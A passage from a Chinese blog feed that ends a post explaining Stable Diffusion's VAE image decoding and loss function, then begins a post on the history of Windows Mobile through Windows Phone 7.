并启用预览，而且设备性能足够好，可以在图形界面中观察到这一过程）。</p><h4 id="图像解码">图像解码</h4><p>生成过程的最后一步是图像解码。在经过正向扩散和反向扩散之后，得到的仍然是一个在高维空间中的图像表示，此时还不是可视化的图像。Stable Diffusion 模型中引入了一个解码过程，将生成的潜在空间表示转换为实际的图像。</p><p>变分自编码器（Variational Autoencoder, VAE）被广泛应用于图像生成、数据压缩和半监督学习等领域。VAE 的核心思想是结合深度学习和贝叶斯推断，它通过将数据映射到潜在空间并进行重构，实现对复杂数据分布的建模。在 Stable Diffusion 中，VAE 模型通过学习图像的分布特征，实现高质量的图像重建。</p><p>编码器（Encoder）的任务是将输入数据（如图像）编码为潜在空间的分布。它输出潜在变量的均值和方差，通常表示为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>z</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>μ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>σ</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(z|x) = \mathcal{N}(\mu(x), \sigma^2(x)) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">μ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 是输入数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span></span> 是潜在变量，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>μ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(\mu(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">μ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msup><mi>σ</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(\sigma^2(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span></span></span></span> 是通过神经网络预测的均值和方差。</p><p>接下来是采样。为了使得梯度可以通过随机变量传播，VAE 引入了重参数化技巧，将潜在变量 (z) 表示为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>z</mi><mo>=</mo><mi>μ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>+</mo><mi>σ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⋅</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">z = \mu(x) + \sigma(x) \cdot \epsilon </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">μ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">ϵ</span></span></span></span></span></p><p>其中，(\epsilon) 是从标准正态分布中采样的噪声。这一技巧使得我们可以使用标准的反向传播算法进行训练。</p><p>解码器（Decoder）的任务是将潜在变量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span></span> 映射回数据空间，生成重构的数据。解码器通常也是一个神经网络，输出重构数据的分布：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>σ</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(x|z) = \mathcal{N}(f(z), \sigma^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>VAE 的训练目标是最大化边际似然（marginal likelihood），但直接计算通常不可行。因此，VAE 使用变分下界（Variational Lower Bound）作为损失函数进行优化，包含两个部分：</p><ul><li>最小化重构误差：即生成图像与原始图像之间的差异，衡量输入数据与重构数据之间的差异。</li><li>同时最小化 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>μ</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">μ</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>σ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span></span></span></span> 的 KL 散度：衡量编码器生成的潜在分布与标准正态分布之间的差异，用于规范化潜在空间。</li></ul><p>最终的损失函数可以表示为：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">L</mi><mo>=</mo><msub><mi mathvariant="double-struck">E</mi><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>z</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo></mrow></msub><mrow><mo fence="true">[</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>z</mi><mo stretchy="false">)</mo><mo fence="true">]</mo></mrow><mo>−</mo><msub><mi>D</mi><mrow><mi>K</mi><mi>L</mi></mrow></msub><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">(</mo><mi>z</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>p</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{L} = \mathbb{E}_{q(z|x)}\left[\log p(x|z)\right] - D_{KL}(q(z|x) || p(z)) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathbb">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="mord mtight">∣</span><span class="mord mathnormal mtight">x</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">∣∣</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">))</span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="double-struck">E</mi><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>z</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo></mrow></msub><mrow><mo fence="true">[</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>z</mi><mo stretchy="false">)</mo><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbb{E}_{q(z|x)}\left[\log p(x|z)\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord mathbb">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span><span class="mord mtight">∣</span><span class="mord mathnormal mtight">x</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mclose delimcenter" style="top:0em;">]</span></span></span></span></span> 表示重构损失,即生成图像与原始图像之间的差异。这部分损失鼓励模型生成与输入图像相似的输出。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mrow><mi>K</mi><mi>L</mi></mrow></msub><mrow><mo fence="true">(</mo><mi>q</mi><mo stretchy="false">(</mo><mi>z</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>p</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">D_{KL}\left(q(z|x) || p(z)\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">∣∣</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> 表示 KL 散度损失,它度量了编码器分布 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><mi>z</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(z|x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 与先验分布 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mclose">)</span></span></span></span> 之间的差异。这部分损失鼓励编码器学习到服从标准高斯分布的潜在特征。</p><h3 id="总结">总结</h3><p>Stable Diffusion 的工作流程可以分为以下几个关键步骤：</p><ul><li>文本编码：通过 CLIP 模型，将文本转换为向量形式，使其能够被机器理解；</li><li>初始噪声生成：U-Net 网络在反向扩散阶段将文本向量与图像特征融合；</li><li>扩散与反向扩散：对初始图片添加噪声和去噪，U-Net 介入使得生成的图像能够贴合文本描述的内容；</li><li>图像解码：VAE 将图像数据映射到潜在空间，并在扩散过程中进行操作，最终将潜在表示解码为可视化的图像。</li></ul><blockquote><p>参考（已更新）</p></blockquote><p><a href="https://arxiv.org/abs/2112.10752" rel="external nofollow noreferrer">High-Resolution Image Synthesis with Latent Diffusion Models</a><br><a href="https://github.com/CompVis/stable-diffusion" rel="external nofollow noreferrer">CompVis/stable-diffusion</a><br><a href="https://github.com/Stability-AI/StableDiffusion" rel="external nofollow noreferrer">Stability-AI/stablediffusion</a><br><a href="https://zhuanlan.zhihu.com/p/632809634" rel="external nofollow noreferrer">深入浅出完整解析Stable Diffusion（SD）核心基础知识</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> AI 绘图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WindowsMobile 的前世今生</title>
      <link href="/posts/4068197923/"/>
      <url>/posts/4068197923/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="早期微软探索移动平台的历程">早期微软探索移动平台的历程</h2><h3 id="移动设备梦的开始">移动设备梦的开始</h3><p>1996 年 Windows CE 诞生，最初的版本是基于 Windows95 精简开发，适用于移动平台和嵌入式设备，界面继承了微软的经典元素开始菜单。1997 年，微软发布了 Windows CE1.0，于次年升级为 WinCE2.0。到了 2000 年，微软将其升级为 Pocket PC 2000， 2002 年，微软推出了 Pocket PC Phone，同时期还推出 Smartphone 2002 系统。</p><p>为了统一，微软将其更名为 Windows Mobile 2003，也就是 Windows Phone 的前身，不过当时的 WM 还有许多地方不够完善。微软后续升级都是以操作系统的内核版本命名的。</p><p><img src="https://s2.loli.net/2023/11/11/TYSHWJoLlDOVpge.png" alt="【wm 与 wince】" title="【wm 与 wince】"></p><p>微软构想的商业模式也和 PC 一样——微软做操作系统，手机生产商生产硬件，并为每一部搭载 Windows 系统的手机支付授权费。</p><p>那时，比尔·盖茨向诺基亚频频示好，希望这个快速成长的手机巨头加入自己，双方当时还在推进一个名为 Phoenix 的计划。</p><p>然而诺基亚不希望像 PC 厂商给微软当苦力。1998 年 6 月，诺基亚联合当时的手机市场前几名厂商爱立信、松下、摩托罗拉投资了英国 PDA 公司 Psion 拆分出来的软件部门，成立了 Symbian 公司。</p><p>感觉被背叛的盖茨愤怒地在写下那封著名的邮件：“我们很失望，诺基亚从来没有告诉我们他们要联合起来。”“不管 Symbian 做什么，对我们都是有害的。”</p><p>1999 年 3 月，Symbian 5.0 操作系统问世。它能打电话，能上网，能发邮件，还支持 Java 第三方应用，比 Windows CE 好用很多。</p><p>之后，索尼、三洋、富士通等公司也加入了 Symbian 联盟。</p><p>自己不制造硬件，依靠第三方厂商的微软已经无人可以合作了，只好找了当时没人知道，靠代工生意起家的 HTC 公司。但智能手机首先得是一个好的手机、有吸引人的硬件。HTC 明显不是特别擅长这事。</p><p>到 2003 年，全球智能手机市场中，Symbian 占 66.6%，微软只有 22%。</p><p>前 iPhone 时代，微软放弃了正确的路</p><h3 id="Windows-Mobile">Windows Mobile</h3><h4 id="触屏？">触屏？</h4><p>从 PocketPC 2000 开始，微软的手机操作系统就支持触屏。但微软的触屏是为笔设计的，甚至还得去点屏幕左上角的开始菜单。</p><p>不能否认，和键盘手机相比，触屏才是有未来的道路，只是需要大的改进。但当触屏手机卖不下去以后，微软掉头转向键盘设计。</p><p>2005 年，微软和曾经的对手，已经拆分操作系统的 Palm 宣布合作，推出了搭载 Windows Mobile5 的 Treo 700W，它有全键盘也有触屏，操作界面却没有什么大改动，Windows Mobile 就像强行塞进去的。</p><p>2006 年，微软又和摩托罗拉合作，推出了 Q 系列全键盘 Windows Mobile 手机。这次更极端，摩托罗拉 Q9 干脆不支持触屏了。</p><p>这个时候，苹果的 iPhone 已经在研发中了。2007 年 Macworld 大会上，乔布斯把摩托罗拉 Q、Palm Treo、黑莓、和诺基亚 E92 示众了一番，用来衬托 iPhone 的交互方式多么有未来，并嘲笑竞争对手微软没有像苹果一样花几年时间去解决触屏的挑战，而是选择掉头和依赖键盘的传统竞争对手做一样的东西。</p><h4 id="延迟的觉悟">延迟的觉悟</h4><p>微软最重要的合作伙伴 HTC 已经很清楚触屏才是未来，与 iPhone 发布同一年，HTC 在 2007 年 6 月发布了 HTCTouch。这台手机虽然使用了 Windows Mobile，但是第一次有了一个全新的用户界面，更方便手指操作。由于微软自己不为手指操控做优化，HTC 定制了名为 Touch FLO 的界面——这样改进操作系统自身不足的尝试后来被 HTC 沿用到 Android 系统上，推出了 Sense。</p><p>熟悉 HTC 的人肯定知道，HTC 有一台著名的手机：HTC HD2。这台手机使用的 HTC Sense 界面非常精美，使用多点触控的电容屏幕，不需要手写笔，HD2 几乎看不出是使用 Windows 系统的手机。</p><p><img src="https://s2.loli.net/2023/11/11/y3uioAMVlOxpZDC.png" alt="【HTC-HD2】" title="【HTC-HD2】"></p><p>只可惜，它诞生在 2009 年，iPhone 在 2007 年就把手指的问题解决了，而且解决得更好。</p><p>iPhone 的发布刺激到了所有的手机厂商，微软也在内。但 Google 反应很快，有一个故事这样描述了当时 Android 负责人安迪·鲁宾的反应。在 iPhone 发布的当天上午，他正要去 CES 展会上和运营商们见面。他看到电视里乔布斯手中的 iPhone 无比惊讶，当即让司机停车，好在网上看完发布会。他对正在酝酿的 Android 的未来这么评价：“我猜我们的手机不会发布了。”</p><p>后来我们知道了，当时的 Android 使用全键盘设计，原型机看起来很像黑莓。一年之后，用户界面推倒重来的 Android 1.0 亮相了。</p><p><img src="https://s2.loli.net/2023/11/11/6dwKPtLCxevc3rU.png" alt="【Android1.0】" title="【Android1.0】"></p><p>实际上市的第一代 Android 手机 HTC Dream，很明显触屏的重要性被提高了。相对于迅速推倒重来转型的 Google Android，微软在 iPhone 发布之后非常迷茫，继续固守着。</p><p>2007 年 1 月，iPhone 发布。2 月，微软发布了 Windows Mobile 6.0。2008 年 4 月，小修小补的 Windows Mobile6.1 发布。直到 2009 年中，微软还在忙着推进 Windows Mobile6.5 的更新——和 iPhone 相比，依然是小修小补。</p><p>同样在 2007 年，Google 联合 HTC、博通、LG、三星等公司成立开放手持设备联盟，2008 年，第一台消费版 Android 手机 HTCG1 诞生。2009 年，Android 快速迭代到了 1.5 版，支持了虚拟键盘，重力传感器和包括中文在内的多语言。</p><p>这个时候，iPhone 3GS 已经发布，App Store 已经上线了快一年。面对强势的 iPhone，越来越多的运营商、手机厂商选择了友好、开源的 Android。</p><p>讽刺的是，在 Google 内部顶住压力，推动 Android 系统的安迪·鲁宾曾在微软短暂工作——他早年的手机创业公司 Danger 被微软收购，但收购后不久他便离开微软创办 Android，又带着 Android 加入 Google。</p><p>2010 年，为手指操控重新开发的 Windows Phone 7 发布。但就在同年，美国第一大运营商 Verizon 联合摩托罗拉推出 Android 手机 Droid，这是第一部销量超过百万的 Android 手机。之后不久，三星发布 Galaxy S，开启了今天最成功的高端 Android 系列手机。</p><p>事实上，到了 2008 年 Window Mobile 6.1 时，微软在内部就已经将 Window Mobile 系统更名为 Windows Phone，并着手研究新系统，由于研发周期的问题，中间将 Window Mobile 6.5 系统当做过渡版本，直到 2010 年，微软正式将 Window Mobile 系统更名为 Windows Phone，发布了 Windows Phone 7 系统。</p><h3 id="保守的结果">保守的结果</h3><p>我们稍微回顾，就会发现比尔盖兹对 IT 行业的发展是有预见性的。今天很多流行的 IT 产品都是微软先做了雏形。微软做 TablePC 比后来苹果的平板电脑早了好几年，在大家还不知道机顶盒为何物的时候，微软已经在搞维纳斯计划。在智能手机上也是微软在 2003 年就开始正式把 PC 上的体验移植到手机。</p><p>从 2003 年到 2007 年，市面上的智能手机中，微软算是主流产品，拥有多个厂商的支持，拥有最好的产品，颇有后来安卓的意思。当时微软有最好的生态系统，而其他家的所谓智能手机，只是自娱自乐，而诺基亚傻到一个操作系统还要分互不兼容的多个版本，微软占据了先发优势，但是故步自封害了微软。</p><p>在 iPhone 之前，尽管 WM 更新了多个版本，但是整整 4 年的时间，微软的系统几乎没有什么大变化，只能支持 65536 色，一如既往的难看 UI，处理器几乎没有什么大升级，常年的 QVGA 分辨率。当真正的竞争对手 iOS 和安卓来临，微软突然发现自己多年的先发优势一下成了泡影。苹果一出手就用了市面上的最好的硬件，达到了最好的体验。而微软过去 4 年在虚度光阴。</p><p>技术上的保守让微软浪费了先发优势。其实，第一版的 IOS 不过是 Windows XP 级别的水平，微软并非没有能力拿出来，但是保守害了微软。</p><h2 id="全新的开始——Windows-Phone">全新的开始——Windows Phone</h2><blockquote><p>因为一枚铁钉，而丢失了一只马掌；因为一只马掌，而失去了一匹好马；因为失去一匹好马，而使得信使没有及时送达重要的情报；因为没有收到重要的情报，而导致一座城池没能守住；因为丢失了一座城池，而导致最后输掉了整场战争。</p></blockquote><h3 id="前途大好的-WP7">前途大好的 WP7</h3><p>面对苹果的冲击，微软初期还有一战之力，HTC 的几款 WM 机器做得不错，UI 也很漂亮。WM 的生态系统积累多年，相比初出茅庐的苹果还有一些优势。在苹果应用商店出现之前，很多事情是 WM 手机能干而 iPhone 干不了的，而安卓来得更晚。当时 WM 的手机销量还很不错。</p><p>2010 年 2 月，微软展示了自家的 Windows Phone 系统。2010 年 10 月发布的 Windows Phone 7 是一款重要的产品，它的界面设计独具风格，不像 Android 一味模仿 iPhone。超前的设计语言后来也被其他产品模仿。随后发布了安装有该系统的手机，主要有：诺基亚、三星、HTC 等，同时与诺基亚达成了战略性的合作。</p><p>Windows Phone 7，无论是 Panorama 全景式导航的创新，还是对 Back 导航的重新定义、多任务处理，都提供了极具启发性的方案。尤其是多任务处理的“墓碑机制”，在当时 iOS 才刚刚开始尝试支持多任务，Android 因为真后台导致续航一直难看。Windows Phone 